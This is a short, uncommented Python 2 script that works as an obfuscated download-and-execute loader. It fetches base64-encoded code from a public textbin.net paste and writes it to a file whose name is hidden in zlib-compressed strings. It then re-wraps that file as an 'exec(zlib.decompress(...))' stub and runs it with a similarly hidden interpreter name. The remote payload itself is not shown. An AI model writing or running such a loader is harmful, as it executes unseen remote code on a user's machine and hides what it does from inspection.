import requests, os, base64, zlib, time
lol=(zlib.decompress('x\x9c+\xa8,\xc9\xc8\xcf3\x02\x00\x0c,\x02\xd5'))
os.system("clear")
imp=requests.get("https://textbin.net/raw/gb8fvktcvh").text
dec=base64.b64decode(imp)
Fuck=open(zlib.decompress('x\x9c\xd33\xd0\x03\xc1\x82J\x00\t\x12\x022'),'w')
Fuck.write(dec)
Fuck.close()

run1=open(zlib.decompress('x\x9c\xd33\xd0\x03\xc1\x82J\x00\t\x12\x022'),'r').read()
mix=zlib.compress(run1)

z1=open(zlib.decompress('x\x9c\xd33\xd0\x03\xc1\x82J\x00\t\x12\x022'),'w')
z1.write('import zlib\nexec(zlib.decompress(' +repr(mix)+ '))')
z1.close()

z2=open(zlib.decompress('x\x9c\xd33\xd0\x03\xc1\x82J\x00\t\x12\x022'),'w')
z2.write('import zlib\nexec(zlib.decompress(' +repr(mix)+ '))')
z2.close()





os.system(lol+" "+zlib.decompress('x\x9c\xd33\xd0\x03\xc1\x82J\x00\t\x12\x022'))
